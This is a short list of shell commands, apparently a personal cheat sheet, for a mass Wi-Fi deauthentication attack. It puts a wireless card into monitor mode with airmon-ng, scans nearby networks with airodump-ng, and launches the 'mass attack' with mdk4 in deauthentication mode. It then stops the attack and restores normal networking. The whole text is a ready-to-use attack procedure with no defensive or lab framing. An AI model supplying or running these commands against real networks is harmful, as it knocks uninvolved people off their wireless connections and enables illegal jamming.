Clean background processes: airmon-ng check kill
Start monitor mode: airmon-ng start wlan0
Start channel hopping in a new tab: airodump-ng wlan0mon
Launch the mass attack: mdk4 wlan0mon d -s 1000
Stop everything using a new tab: killall -9 mdk4
Turn off monitor mode: airmon-ng stop wlan0mon
Restore normal internet: systemctl restart NetworkManager
